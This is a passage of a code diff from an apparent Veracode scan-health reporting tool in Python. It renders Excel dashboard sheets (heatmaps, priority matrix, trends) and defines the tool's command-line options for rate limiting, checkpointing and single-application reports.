+        c.alignment = Alignment(horizontal="left", vertical="center", indent=1)
+        ws.merge_cells(start_row=r, start_column=2, end_row=r, end_column=3)
+        c = ws.cell(row=r, column=2, value=_ctx(n, m.total_apps))
+        c.font = Font(name=_FONT, size=10)
+        c.alignment = Alignment(horizontal="left", vertical="center")
+        ws.merge_cells(start_row=r, start_column=4, end_row=r, end_column=W)
+        c = ws.cell(row=r, column=4, value="\u2588" * int(round(50 * _pct(n, m.total_apps) / 100.0)))
+        c.font = Font(name=_FONT, size=10, color=cfg["colors"][lv])
+        c.alignment = Alignment(horizontal="left", vertical="center")
+        r += 1
+    r = note(r, "Unknown covers profiles with no published scan results. "
+                "They are never counted as healthy.")
+    r += 1
+
+    # ---- attention distribution
+    r = band(r, "ATTENTION SCORE DISTRIBUTION")
+    meaning = {"RED": "Immediate attention (80-100)", "ORANGE": "High priority (60-79)",
+               "YELLOW": "Attention required (40-59)", "GREEN": "Normal or monitor (0-39)"}
+    data, levels = [], []
+    for lv in ("RED", "ORANGE", "YELLOW", "GREEN"):
+        n = m.attention_bands.get(lv, 0)
+        data.append([lv, _ctx(n, m.total_apps), meaning[lv]])
+        levels.append([lv, "", ""])
+    r = _write_table(ws, r, ["Band", "Applications", "Meaning"], data, levels, cfg,
+                     spans=[2, 3, 7], left_cols=(2,))
+    r += 1
+
+    # ---- priority matrix
+    r = band(r, "PRIORITY MATRIX   scan health vs security findings")
+    r = note(r, "Two independent dimensions. Built only from indicators the scanner produces; "
+                "business criticality is not available from the Veracode data and is not inferred.")
+    q = m.quadrants
+    grid = [
+        ["", "LOW scan-health risk", "HIGH scan-health risk"],
+        ["HIGH findings risk", f"REVIEW\n{q.get('Review', 0)} apps", f"IMMEDIATE\n{q.get('Immediate', 0)} apps"],
+        ["LOW findings risk", f"MONITOR\n{q.get('Monitor', 0)} apps", f"ATTENTION\n{q.get('Attention', 0)} apps"],
+    ]
+    glevels = [["", "", ""], ["", "ORANGE", "RED"], ["", "GREEN", "YELLOW"]]
+    for ri, gr in enumerate(grid):
+        col = 1
+        for ci, v in enumerate(gr):
+            span = 1 if ci == 0 else 5
+            if span > 1:
+                ws.merge_cells(start_row=r + ri, start_column=col, end_row=r + ri,
+                               end_column=col + span - 1)
+            cell = ws.cell(row=r + ri, column=col, value=v)
+            cell.font = Font(name=_FONT, size=11, bold=True)
+            cell.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
+            lv = glevels[ri][ci]
+            for cc in range(col, col + span):
+                ws.cell(row=r + ri, column=cc).border = _BORDER
+                if lv:
+                    ws.cell(row=r + ri, column=cc).fill = _lvl_fill(lv, cfg)
+            col += span
+        ws.row_dimensions[r + ri].height = 38 if ri else 18
+    r += 3
+    r = note(r, f"Insufficient data: {q.get('Insufficient Data', 0)} application profile(s).")
+    r += 1
+
+    # ---- top organisational issues
+    r = band(r, "TOP ORGANISATIONAL ISSUES")
+    data, levels = [], []
+    for row_ in [x for x in issue_rows if x["Apps Affected"] > 0][:cfg["top_n_issues"]]:
+        data.append([row_["Issue"], row_["Severity"],
+                     _ctx(row_["Apps Affected"], row_["Total Apps"]),
+                     row_["Category"], row_["Trend"]])
+        levels.append(["", row_["_level"], row_["_level"], "", _trend_risk(row_["Trend"])])
+    if not data:
+        data = [["No failing health checks across the tenant", "", "", "", ""]]
+        levels = [["GREEN", "", "", "", ""]]
+    r = _write_table(ws, r, ["Issue", "Severity", "Apps Affected", "Category", "Trend"],
+                     data, levels, cfg, spans=[4, 1, 3, 2, 2], left_cols=(0,))
+    r = note(r, "Full list of all 31 health checks is on the 'Issue Heatmap' sheet.")
+    r += 1
+
+    # ---- tenant trend
+    r = band(r, "TENANT TREND vs PREVIOUS REPORT")
+    if tenant_trend:
+        arrows = {"UP": "\u2191", "DOWN": "\u2193", "=": "\u2192", "+": "\u2192", "-": "\u2192"}
+        data = [[t["Metric"], t["Previous"], t["Current"], t["Change"],
+                 arrows.get(t["Direction"], t["Direction"])] for t in tenant_trend]
+        levels = [["", "", "", t["_level"], t["_level"]] for t in tenant_trend]
+        r = _write_table(ws, r, ["Metric", "Previous", "Current", "Change", "Direction"],
+                         data, levels, cfg, spans=[4, 2, 2, 2, 2], left_cols=(0,))
+        r = note(r, "Direction is semantic: fewer poor applications is green, more total flaws "
+                    "is red. Arrows do not simply follow the sign of the change.")
+    else:
+        r = note(r, "No previous report supplied. Re-run with --previous-report to enable "
+                    "trend analysis.")
+    r += 1
+
+    # ---- applications requiring attention
+    r = band(r, "APPLICATIONS REQUIRING ATTENTION")
+    r = note(r, "Ranked by the transparent Attention Score. This is a scan-health and findings "
+                "prioritisation ranking, not a 'most vulnerable applications' list.")
+    plist = build_priority_list(apps, cfg=cfg)
+    data, levels = [], []
+    for p in plist:
+        data.append([p["Priority"], p["Application"], p["Attention Score"], p["Scan Health"],
+                     p["Very High / High Flaws"], p["Scan Age (days)"], p["Top Issue"],
+                     p["Trend"], p["Why"]])
+        levels.append(["", "", p["_level"], _health_risk(p["Scan Health"]),
+                       "", "", "", _trend_risk(p["Trend"]), ""])
+    if not data:
+        data, levels = [["", "No applications scored", "", "", "", "", "", "", ""]], []
+    r = _write_table(ws, r,
+                     ["#", "Application", "Score", "Health", "V.High / High",
+                      "Scan age", "Top issue", "Trend", "Why this score"],
+                     data, levels, cfg,
+                     spans=[1, 2, 1, 1, 1, 1, 2, 1, 2], left_cols=(1, 6, 8),
+                     row_height=60)
+    r += 1
+    r = note(r, "Drill down on the 'App Heatmap' and 'Issue Heatmap' sheets, both filterable "
+                "and sortable. Raw evidence remains on the original detail sheets.")
+    ws.freeze_panes = "A5"
+
+
+def _kpi_row(ws, r: int, kpis: list[tuple[str, str, str, str]], cfg: dict, span: int) -> int:
+    """Render KPI cards spread evenly across the full `span` of grid columns."""
+    n = len(kpis)
+    base, rem = divmod(span, n)
+    col = 1
+    for idx, (label, value, sub, lv) in enumerate(kpis):
+        width = base + (1 if idx < rem else 0)
+        end = col + width - 1
+        for rr, text, font in (
+            (r, label, Font(name=_FONT, size=9, bold=True, color="555555")),
+            (r + 1, value, Font(name=_FONT, size=18, bold=True, color=cfg["colors"][lv])),
+            (r + 2, sub, Font(name=_FONT, size=8, color="666666")),
+        ):
+            ws.merge_cells(start_row=rr, start_column=col, end_row=rr, end_column=end)
+            c = ws.cell(row=rr, column=col, value=text)
+            c.font = font
+            c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
+            for cc in range(col, end + 1):
+                cell = ws.cell(row=rr, column=cc)
+                cell.fill = _KPI_FILL
+                cell.border = _BORDER
+        col = end + 1
+    ws.row_dimensions[r].height = 15
+    ws.row_dimensions[r + 1].height = 26
+    ws.row_dimensions[r + 2].height = 15
+    return r + 4
+
+
+_HEATMAP_WIDTHS = {
+    "Application": 34, "Sandbox": 16, "Business Unit": 20, "Attention Score": 9,
+    "Priority": 20, "Scan Health": 11, "Scan Age": 9, "Scan Age Bucket": 13,
+    "Findings Risk": 13, "Very High Flaws": 11, "High Flaws": 9, "Medium Flaws": 11,
+    "Low Flaws": 9, "Total Flaws": 10, "Open Policy Flaws": 12, "SCA": 10,
+    "Weighted Flaws": 11, "Flaw Density": 11, "Density Basis": 18,
+    "Veracode Score": 11, "Veracode Rating": 11, "Policy Status": 15, "Findings Basis": 26,
+    "SCA Components": 12, "Health Issues": 11, "High-Severity Issues": 13,
+    "Upload Size (MB)": 13, "Last Scan": 20, "Previous Health": 13, "Change": 9,
+    "Trend": 11, "Quadrant": 15,
+    "Top Issue": 44,
+}
+
+
+def _write_app_heatmap_sheet(wb: Workbook, apps: Sequence[ApplicationHealth], cfg: dict) -> None:
+    ws = wb.create_sheet("App Heatmap")
+    ws.page_setup.orientation = "landscape"
+    ws.page_setup.fitToWidth = 1
+    ws.page_setup.fitToHeight = 0
+    ws.sheet_properties.pageSetUpPr.fitToPage = True
+    ws.print_title_rows = "1:2"
+    rows = build_heatmap_rows(apps, cfg)
+    headers = [h for h in (rows[0].keys() if rows else []) if not h.startswith("_")]
+    if not rows:
+        ws["A1"] = "No applications."
+        return
+
+    title_row = 1
+    ws.merge_cells(start_row=1, start_column=1, end_row=1, end_column=len(headers))
+    c = ws.cell(row=1, column=1,
+                value="APPLICATION HEATMAP    |    "
+                      "Scan health and security findings are separate dimensions. "
+                      + DISCLAIMER)
+    c.fill = _TITLE_FILL
+    c.font = Font(name=_FONT, size=11, bold=True, color="FFFFFF")
+    c.alignment = Alignment(horizontal="left", vertical="center", indent=1)
+    ws.row_dimensions[1].height = 22
+
+    hr = title_row + 1
+    for ci, h in enumerate(headers, 1):
+        c = ws.cell(row=hr, column=ci, value=h)
+        c.fill = _BAND_FILL
+        c.font = Font(name=_FONT, size=9, bold=True, color="FFFFFF")
+        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
+        c.border = _BORDER
+        ws.column_dimensions[get_column_letter(ci)].width = _HEATMAP_WIDTHS.get(h, 13)
+    ws.row_dimensions[hr].height = 30
+
+    for ri, row in enumerate(rows, hr + 1):
+        for ci, h in enumerate(headers, 1):
+            c = ws.cell(row=ri, column=ci, value=_safe_cell(row.get(h)))
+            c.font = Font(name=_FONT, size=9)
+            c.border = _BORDER
+            c.alignment = Alignment(
+                horizontal="left" if h in ("Application", "Top Issue", "Business Unit") else "center",
+                vertical="center")
+            lv = row.get(f"_lv_{h}")
+            if lv:
+                c.fill = _lvl_fill(lv, cfg)
+                if lv in ("RED", "ORANGE"):
+                    c.font = Font(name=_FONT, size=9, bold=True, color=cfg["colors"][lv])
+
+    last = hr + len(rows)
+    ws.auto_filter.ref = f"A{hr}:{get_column_letter(len(headers))}{last}"
+    ws.freeze_panes = ws.cell(row=hr + 1, column=4)
+
+
+def _write_issue_heatmap_sheet(wb: Workbook, issue_rows: list[dict],
+                               m: TenantMetrics, cfg: dict) -> None:
+    ws = wb.create_sheet("Issue Heatmap")
+    ws.page_setup.orientation = "landscape"
+    ws.page_setup.fitToWidth = 1
+    ws.page_setup.fitToHeight = 0
+    ws.sheet_properties.pageSetUpPr.fitToPage = True
+    ws.print_title_rows = "1:2"
+    headers = ["Check #", "Issue", "Category", "Severity", "Apps Affected",
+               "% of Tenant", "Prevalence", "Occurrences", "Business Units Affected",
+               "Previous Apps Affected", "Trend", "Top Recommendation"]
+    widths = {"Check #": 8, "Issue": 46, "Category": 17, "Severity": 10,
+              "Apps Affected": 13, "% of Tenant": 12, "Prevalence": 24,
+              "Occurrences": 12, "Business Units Affected": 13,
+              "Previous Apps Affected": 13, "Trend": 12, "Top Recommendation": 60}
+
+    ws.merge_cells(start_row=1, start_column=1, end_row=1, end_column=len(headers))
+    c = ws.cell(row=1, column=1,
+                value=f"ORGANISATIONAL ISSUE HEATMAP    |    All 31 health checks across "
+                      f"{m.total_apps:,} application profiles")
+    c.fill = _TITLE_FILL
+    c.font = Font(name=_FONT, size=11, bold=True, color="FFFFFF")
+    c.alignment = Alignment(horizontal="left", vertical="center", indent=1)
+    ws.row_dimensions[1].height = 22
+
+    hr = 2
+    for ci, h in enumerate(headers, 1):
+        c = ws.cell(row=hr, column=ci, value=h)
+        c.fill = _BAND_FILL
+        c.font = Font(name=_FONT, size=9, bold=True, color="FFFFFF")
+        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
+        c.border = _BORDER
+        ws.column_dimensions[get_column_letter(ci)].width = widths.get(h, 14)
+    ws.row_dimensions[hr].height = 30
+
+    for ri, row in enumerate(issue_rows, hr + 1):
+        bar = "#" * int(round(30 * min(row["% of Tenant"], 100) / 100.0))
+        vals = [row["Check #"], row["Issue"], row["Category"], row["Severity"],
+                _ctx(row["Apps Affected"], row["Total Apps"]),
+                row["% of Tenant"] / 100.0, bar, row["Occurrences"],
+                row["Business Units Affected"], row["Previous Apps Affected"],
+                row["Trend"], row["Top Recommendation"]]
+        for ci, v in enumerate(vals, 1):
+            c = ws.cell(row=ri, column=ci, value=_safe_cell(v))
+            c.font = Font(name=_FONT, size=9)
+            c.border = _BORDER
+            c.alignment = Alignment(
+                horizontal="left" if headers[ci - 1] in ("Issue", "Top Recommendation", "Category")
+                else "center",
+                vertical="center", wrap_text=headers[ci - 1] == "Top Recommendation")
+            if headers[ci - 1] == "% of Tenant":
+                c.number_format = "0.0%"
+            if headers[ci - 1] in ("Severity", "Apps Affected"):
+                c.fill = _lvl_fill(row["_level"], cfg)
+            if headers[ci - 1] == "Prevalence":
+                c.font = Font(name="Consolas", size=9, color=cfg["colors"][row["_level"]])
+            if headers[ci - 1] == "Trend":
+                lv = _trend_risk(row["Trend"])
+                if lv != "GRAY":
+                    c.fill = _lvl_fill(lv, cfg)
+
+    last = hr + len(issue_rows)
+    ws.auto_filter.ref = f"A{hr}:{get_column_letter(len(headers))}{last}"
+    ws.freeze_panes = ws.cell(row=hr + 1, column=3)
+
+
+# ==========================================================================
+# Top-level dashboard entry point
+# ==========================================================================
+
+def generate_dashboard(health_rows: Sequence[dict],
+                       issue_records: Sequence[dict],
+                       prev_rows: dict | None = None,
+                       cfg: dict | None = None,
+                       check_categories: dict[int, str] | None = None,
+                       prev_issue_counts: dict[int, int] | None = None) -> dict:
+    """Normalize, score and aggregate. Returns everything the writers need."""
+    cfg = cfg or DASHBOARD_CONFIG
+    apps, issues = build_application_health(
+        health_rows, issue_records, prev_rows, cfg, check_categories)
+    metrics = aggregate_tenant(apps, cfg)
+    issue_rows = build_issue_heatmap(issues, metrics.total_apps, cfg, prev_issue_counts)
+    tenant_trend = build_tenant_trend(metrics, prev_rows, cfg)
+    return {
+        "apps": apps,
+        "issues": issues,
+        "metrics": metrics,
+        "issue_rows": issue_rows,
+        "tenant_trend": tenant_trend,
+        "config": cfg,
+    }
+
+
+def write_dashboard_xlsx(path: str, bundle: dict) -> None:
+    """Standalone dashboard workbook (used when the main report is CSV/JSON)."""
+    wb = Workbook()
+    wb.remove(wb.active)
+    write_dashboard_sheets(wb, bundle["apps"], bundle["issues"], bundle["metrics"],
+                           bundle["tenant_trend"], bundle["issue_rows"], bundle["config"])
+    wb.save(path)
+
+
+# ==========================================================================
+# Main
+# ==========================================================================
+
+def _print_summary(health: list[dict]) -> None:
+    tot = len(health)
+    good = sum(1 for r in health if r.get("Health")=="Good")
+    fair = sum(1 for r in health if r.get("Health")=="Fair")
+    poor = sum(1 for r in health if r.get("Health")=="Poor")
+    err = sum(1 for r in health if r.get("Scan Status")=="Error")
+    print(f"\nTenant Summary: {tot} apps - Good: {good}, Fair: {fair}, Poor: {poor}, Error: {err}")
+    counter: Counter[str] = Counter()
+    for r in health:
+        txt = r.get("Issues","")
+        if txt == "None": continue
+        for part in str(txt).split("; "):
+            clean = re.sub(r'\[(?:HIGH|MEDIUM|LOW)\]\s*', '', part).strip()
+            clean = re.sub(r'"[^"]*"', '(name)', clean)
+            if clean: counter[clean] += 1
+    if counter:
+        print("Top issues:")
+        for pattern, count in counter.most_common(3):
+            print(f"  [{count}x] {pattern[:100]}")
+
+
+def _plan_note(n_apps: int, sandboxes: bool, budget: float) -> str:
+    """Estimate runtime from the published limits and the real call mix.
+    """
+    per_app = 4.0
+    if sandboxes:
+        per_app += 1.0 + 4.0        # sandbox list, plus one sandbox on average
+    report_rpm = RateLimiter.LIMITS["report"] * budget / 100.0
+    xml_rpm = RateLimiter.LIMITS["xml"] * budget / 100.0
+    report_calls = 1.0 + (1.0 if sandboxes else 0.0)
+    xml_calls = per_app - report_calls
+    apps_per_min = min(report_rpm / report_calls, xml_rpm / max(xml_calls, 0.001))
+    secs = n_apps / apps_per_min * 60.0 if apps_per_min else 0.0
+    return (f"~{per_app:.0f} requests/profile, {apps_per_min:.0f} profiles/min at "
+            f"{budget:.0f}% of the limits: estimated {_hms(secs)} for "
+            f"{n_apps:,} profiles")
+
+
+# Flags that existed in earlier versions and no longer do anything. Accepted
+# silently-with-a-warning rather than rejected, so scheduled jobs do not start
+# hard-failing on an upgrade.
+_RETIRED_FLAGS = {
+    "--request-delay": "replaced by --rate-budget, which paces each endpoint "
+                       "class against its own published limit",
+    "--delay": "removed: it paced applications, not requests, and was always "
+               "non-binding behind the request pacer",
+    "--resume": "removed: the JSONL checkpoint resumes automatically",
+    "--no-checkpoint": "removed: checkpointing is always on",
+    "--auth-retry-base": "removed: fixed at 30s",
+    "--auth-retry-cap": "removed: fixed at 300s",
+    "--net-retries": "removed: fixed at 5",
+}
+
+
+def _strip_retired(argv: list[str]) -> list[str]:
+    out: list[str] = []
+    i = 0
+    while i < len(argv):
+        a = argv[i]
+        name = a.split("=", 1)[0]
+        if name in _RETIRED_FLAGS:
+            log.warning("[!] %s is retired and ignored: %s", name, _RETIRED_FLAGS[name])
+            if "=" not in a and i + 1 < len(argv) and not argv[i + 1].startswith("-"):
+                i += 1      # consume its value
+            i += 1
+            continue
+        out.append(a)
+        i += 1
+    return out
+
+
+def main() -> None:
+    p = argparse.ArgumentParser(
+        description="Veracode Tenant-Wide Scan Health v4.0",
+        epilog="Rate limits are per IP address, not per credential. If CI runners or "
+               "other automation share this host's egress IP, lower --rate-budget.")
+    p.add_argument("--out-dir", default=None, metavar="DIR",
+                   help="Root folder for everything the tool writes (default ./scan_health_output): "
+                        "tenant/ run folders, apps/ reports, history/ (keep, holds the trends) "
+                        "and cache/ (safe to delete)")
+    p.add_argument("--output", default=None, metavar="FILE",
+                   help="Main bulk output file. Default: scan_health.<format> in a new run folder "
+                        "<out-dir>/tenant/<region>/<timestamp>/; rerunning the same command "
+                        "resumes the newest unfinished run")
+    p.add_argument("--output-format", choices=["xlsx","csv","json"], default="xlsx")
+    # default None so an explicit --region can be told apart from the default
+    # (a --scan link carries its own region); resolved to commercial below.
+    p.add_argument("--region", choices=["commercial","eu"], default=None,
+                   help="Veracode region (default commercial)")
+
+    # --- pacing
+    p.add_argument("--rate-budget", type=float, default=70.0, metavar="PCT",
+                   help="Share of Veracode's published per-IP rate limits to consume, "
+                        "per endpoint class (default 70). Each class is paced against its "
+                        "own ceiling: 80/min for detailedreport and the other Results XML "
+                        "APIs, 250/min for the remaining XML APIs, 500/min for REST. "
+                        "Lower this if other automation shares your egress IP.")
+    p.add_argument("--parallel", type=int, default=8, metavar="N",
+                   help="Concurrent workers (default 8). This does NOT raise the request "
+                        "rate, which is fixed by --rate-budget. It exists so that slow "
+                        "responses (detailedreport on a large application can take tens of "
+                        "seconds) do not leave the rate budget unused.")
+    p.add_argument("--max-retries", type=int, default=8,
+                   help="Retry attempts for 5xx responses (default 8). 429 is handled by "
+                        "the rate limiter, not by blind retry.")
+    p.add_argument("--retry-backoff", type=float, default=2.0,
+                   help="Exponential backoff factor for 5xx retries (default 2.0)")
+    p.add_argument("--timeout", type=int, default=120)
+    p.add_argument("--auth-retry-window", type=float, default=3600.0, metavar="SECONDS",
+                   help="How long to keep retrying a single request through 401/403 before "
+                        "abandoning THAT REQUEST (default 3600). The run never aborts on a "
+                        "mid-run auth failure.")
+
+    # --- scope
+    p.add_argument("--max-apps", type=int, default=0)
+    p.add_argument("--app-name-filter", default=None, help="Regex to filter app names")
+    p.add_argument("--include-sandboxes", action="store_true",
+                   help="Also evaluate sandbox scans. Roughly doubles runtime.")
+    p.add_argument("--skip-no-scan", action="store_true")
+    p.add_argument("--skip-checks", default=None, help="Comma-separated check numbers to skip")
+
+    # --- output
+    p.add_argument("--detail", choices=["csv","xlsx","none"], default="csv",
+                   help="Where per-module and per-file rows go. 'csv' (default) streams them "
+                        "to companion CSVs during the run: constant memory, no row cap. "
+                        "'xlsx' buffers them into the workbook, which is fine for small "
+                        "tenants but will exhaust memory and hit Excel's 1,048,576-row "
+                        "ceiling on a large one. 'none' discards them.")
+    p.add_argument("--no-dashboard", action="store_true",
+                   help="Skip the executive dashboard sheets. The dashboard costs no API "
+                        "calls, so it is on by default.")
+    p.add_argument("--dashboard-output", default=None,
+                   help="Dashboard workbook path, used only when --output-format is csv or json")
+    p.add_argument("--previous-report", default=None, help="Path to prior xlsx for trend analysis")
+    p.add_argument("--snapshot-dir", default=None, metavar="DIR",
+                   help="Where each bulk run saves a compact snapshot for tenant trends "
+                        "(default <out-dir>/history/tenant)")
+    p.add_argument("--no-snapshot", action="store_true",
+                   help="Do not save a snapshot for this run")
+    p.add_argument("--no-html", action="store_true",
+                   help="Do not write the tenant HTML report (<output>_tenant_report.html). "
+                        "It costs no API calls, so it is on by default")
+    p.add_argument("--trend-window", type=int, default=12, metavar="N",
+                   help="Most recent comparable snapshots used for tenant trends, this run "
+                        "included (default 12)")
+    p.add_argument("--keep-snapshots", type=int, default=0, metavar="N",
+                   help="After a run, keep only the newest N snapshots (default 0 = keep all)")
+
+    # --- durability
+    p.add_argument("--checkpoint", default=None,
+                   help="JSONL checkpoint path (default: <output>.ckpt.jsonl). Written and "
+                        "fsync'd after every profile. Rerun the same command to resume.")
+    p.add_argument("--restart", action="store_true",
+                   help="Move any existing checkpoint aside and start from scratch")
+
+    p.add_argument("--dry-run", action="store_true",
+                   help="List the profiles that would be processed, with a runtime estimate")
+    p.add_argument("--log-level", choices=["DEBUG","INFO","WARNING"], default="INFO")
+
+    # --- single-application report (any of --app/--app-id/--app-guid enables it)
+    sa = p.add_argument_group(
+        "single-application report",
+        "Deep health report for one application profile: build history, trends, "
+        "diffs and an action plan. Enabled by --app, --app-id or --app-guid, or by "
+        "--scan for exactly one scan. The tenant-wide options above are unaffected.")
+    target = sa.add_mutually_exclusive_group()
+    target.add_argument("--app", default=None, metavar="NAME_OR_LINK",
+                        help="Exact application profile name (case-insensitive), or a Veracode "
+                             "Platform link to the application or any of its scans")
+    target.add_argument("--app-id", type=int, default=None, metavar="ID",
+                        help="Legacy numeric app_id")
+    target.add_argument("--app-guid", default=None, metavar="GUID",
+                        help="REST application GUID")
+    target.add_argument("--scan", "--sast", dest="scan", default=None, metavar="URL_OR_BUILD_ID",
+                        help="Analyse one scan: a Veracode Platform link to the scan (Triage "
+                             "Flaws, Review Modules, Static Overview, results or report pages) "
+                             "or a build ID, or a sandbox link. The region is taken from the "
+                             "link. Earlier builds in the same policy or sandbox context are "
+                             "added for the trend (see --history)")
+    sa.add_argument("--history", type=int, default=10, metavar="N",
+                    help="Published builds to analyse, latest included (default 10, "
+                         "0 = latest only, hard cap 50). With --scan: the linked build plus "
+                         "the builds before it, for the trend")
+    sa.add_argument("--history-since", default=None, metavar="YYYY-MM-DD",
+                    help="Instead of --history: every build published since this date "
+                         "(still capped at 50)")
+    sa.add_argument("--history-mode", choices=["full", "light"], default="full",
+                    help="full: rerun all checks on every historical build. light: "
+                         "summaryreport and getbuildinfo only (trends, no check history)")
+    sa.add_argument("--sandbox", default=None, metavar="NAME",
+                    help="Analyse this sandbox's history instead of the policy context")
+    sa.add_argument("--findings-age", action=argparse.BooleanOptionalAction, default=True,
+                    help="Use the Findings REST API v2 for flaw aging (default on)")
+    sa.add_argument("--reporting-api", choices=["auto", "on", "off"], default="auto",
+                    help="Use the Reporting REST API SCANS report for duration enrichment. "
+                         "auto probes once and degrades silently (default auto)")
+    sa.add_argument("--report-dir", default=None, metavar="DIR",
+                    help="Output folder (default <out-dir>/apps/<app>_<app_id>/<timestamp>/)")
+    sa.add_argument("--formats", default="html,xlsx,json,md",
+                    help="Comma list of html, xlsx, json, md (default all four)")
+    sa.add_argument("--cache-dir", default=None, metavar="DIR",
+                    help="Cached API responses (default <out-dir>/cache). Safe to delete at any "
+                         "time; trend history lives in <out-dir>/history")
+    sa.add_argument("--no-cache", action="store_true", help="Neither read nor write the cache")
+    sa.add_argument("--refresh-cache", action="store_true",
+                    help="Ignore cached responses but write fresh ones")
+    sa.add_argument("--fail-on", default=None, metavar="RULES",
+                    help="CI gate, e.g. health=Poor,duration-regression,policy=Did Not Pass. "
+                         "Exit code 4 when any rule fails; reports are always written")
+    sa.add_argument("--baseline-window", type=int, default=10, metavar="N",
+                    help="Published builds used for the duration baseline (default 10)")
+
+    # A Windows console or a redirected stream may use a legacy code page; an
+    # application name it cannot encode must never crash the run.
+    for stream in (sys.stdout, sys.stderr):
+        with contextlib.suppress(AttributeError, ValueError):
+            stream.reconfigure(errors="backslashreplace")
+    logging.basicConfig(level=logging.INFO,
+                        format="%(asctime)s %(levelname)-5s %(message)s", datefmt="%H:%M:%S",
+                        force=True)
+    args = p.parse_args(_strip_retired(sys.argv[1:]))
+    args.region_explicit = args.region is not None
+    if args.region is None:
+        args.region = "commercial"
+    from helpers import output_layout
+    output_layout.resolve(args)
+    if not args.dry_run:
+        output_layout.migrate_legacy(args)
+
+    if args.trend_window < 1:
+        p.error("--trend-window must be >= 1")
+    if args.parallel < 1:
+        p.error("--parallel must be >= 1")
+    if not 1 <= args.rate_budget <= 100:
+        p.error("--rate-budget must be between 1 and 100")
+    if args.rate_budget > 85:
+        log.warning("[!] --rate-budget %.0f%% leaves little headroom for other consumers "
+                    "of this egress IP and makes 429s likely.", args.rate_budget)
+    if args.max_retries < 0:
+        p.error("--max-retries must be >= 0")
+    if args.retry_backoff < 0:
+        p.error("--retry-backoff must be >= 0")
+    if args.timeout < 1:
+        p.error("--timeout must be >= 1")
+    if args.max_apps < 0:
+        p.error("--max-apps must be >= 0")
+    if args.auth_retry_window < 0:
+        p.error("--auth-retry-window must be >= 0")
+    if args.app_name_filter:
+        try:
+            re.compile(args.app_name_filter)
+        except re.error as e:
+            p.error(f"--app-name-filter is not a valid regex: {e}")
+
+    logging.getLogger().setLevel(getattr(logging, args.log_level))
+
+    skip_checks: set[int] = set()
+    if args.skip_checks:
+        try:
+            skip_checks = {int(x.strip()) for x in args.skip_checks.split(",") if x.strip()}
+        except ValueError:
+            p.error("--skip-checks must be comma-separated integers")
+        log.info("[*] Skipping checks: %s", sorted(skip_checks))
+
+    # ---- single-application mode. Dispatched before any bulk state (checkpoint,
+    # detail CSVs) is created, so the bulk path is untouched. The import is lazy
+    # because app_report imports this module: run as a script, this file is
+    # __main__, and app_report works entirely against its own `scan_health`
+    # import, so no object crosses between the two copies.
+    if (args.app is not None or args.app_id is not None or args.app_guid is not None
+            or args.scan is not None):
+        if args.app_name_filter:
+            p.error("--app-name-filter cannot be combined with --app/--app-id/--app-guid/--scan")
+        from helpers import app_report
+        raise SystemExit(app_report.run(args, skip_checks))
+
+    # ---- run folder: by default every bulk run gets its own folder under
+    # <out-dir>/tenant/<region>/, and rerunning resumes the newest unfinished
+    # one with the same scope. An explicit --output is used exactly as given.
+    args.layout_run = args.output is None
+    if args.layout_run:
+        from helpers import tenant_report
+        out_file, resumed, note = output_layout.bulk_output(
+            args, tenant_report.run_scope(args, skip_checks), create=not args.dry_run)
+        args.output = str(out_file)
+        if note:
+            log.warning("[!] %s", note)
+        if resumed:
+            log.info("[*] Resuming the unfinished run in %s (--restart starts a new one)",
+                     out_file.parent)
+        elif not args.dry_run:
+            log.info("[*] Run folder: %s", out_file.parent)
+
+    # ---- checkpoint (a dry run never creates one)
+    ckpt_path = args.checkpoint or f"{Path(args.output).with_suffix('')}.ckpt.jsonl"
+    if args.dry_run and not Path(ckpt_path).exists():
+        ckpt_path = None
+    if ckpt_path and args.restart and Path(ckpt_path).exists():
+        backup = f"{ckpt_path}.{datetime.now().strftime('%Y%m%d_%H%M%S')}.bak"
+        Path(ckpt_path).rename(backup)
+        log.warning("[*] --restart: existing checkpoint moved to %s", backup)
+    ckpt = Checkpoint(ckpt_path)
+    if ckpt_path:
+        log.info("[*] Checkpoint: %s (fsync'd after every profile)", ckpt_path)
+    skip_set: set[tuple[str, str]] = set(ckpt.done_keys)
+
+    detail = DetailWriter(args.output, enabled=args.detail == "csv" and not args.dry_run)
+    buffered_mods: list[dict] = []
+    buffered_files: list[dict] = []
+
+    prev_data: dict | None = None
+    if args.previous_report:
+        prev_data = _load_previous(args.previous_report)
+        log.info("[*] Previous report: %d apps loaded for trend analysis", len(prev_data))
+
+    name_filter = re.compile(args.app_name_filter) if args.app_name_filter else None
+    failures: list[str] = []
+    guid_by_id: dict[str, str] = {}     # legacy app id -> REST GUID, for snapshots only
+
+    def _finalize(client: "VeracodeClient | None", complete: bool = True) -> None:
+        """Write the report from whatever is durable. Runs in a finally block,
+        so it executes on every exit path including auth failure and Ctrl-C."""
+        h_rows = ckpt.rows["health"]
+        if not h_rows:
+            log.warning("[!] No application rows collected; nothing to write.")
+            return
+        r_rows = ckpt.rows["recs"]
+        t_rows = ckpt.rows["trends"]
+        agg_records = ckpt.rows["agg"]
+        agg = _build_aggregation([AggIssue(**d) for d in agg_records], len(h_rows))
+
+        log.info("[*] Writing %d health / %d rec / %d trend rows...",
+                 len(h_rows), len(r_rows), len(t_rows))
+
+        bundle = None
+        if not args.no_dashboard:
+            try:
+                bundle = generate_dashboard(
+                    health_rows=h_rows, issue_records=agg_records,
+                    prev_rows=prev_data, check_categories=CHECK_CATEGORIES,
+                    prev_issue_counts=(_load_previous_agg(args.previous_report)
+                                       if args.previous_report else None))
+                log.info("[*] Dashboard: %d profiles scored, %d structured issues",
+                         len(bundle["apps"]), len(bundle["issues"]))
+            except Exception as e:
+                log.warning("Dashboard generation failed, core report unaffected: %s", e)
+
+        fmt = args.output_format
+        if fmt == "xlsx":
+            write_excel(h_rows, buffered_mods, buffered_files, r_rows, t_rows, agg,
+                        args.output, dash_bundle=bundle)
+        elif fmt == "csv":
+            write_csv(h_rows, buffered_mods, buffered_files, r_rows, t_rows, agg, args.output)
+        elif fmt == "json":
+            write_json(h_rows, buffered_mods, buffered_files, t_rows, args.output)
+
+        if bundle is not None and fmt != "xlsx":
+            xp = args.dashboard_output or f"{Path(args.output).with_suffix('')}_dashboard.xlsx"
+            write_dashboard_xlsx(xp, bundle)
+            log.info("[+] Dashboard workbook: %s", xp)
+
+        if detail.enabled:
+            for kind, path in detail.paths.items():
+                log.info("[+] %s: %s (%d rows appended this run)",
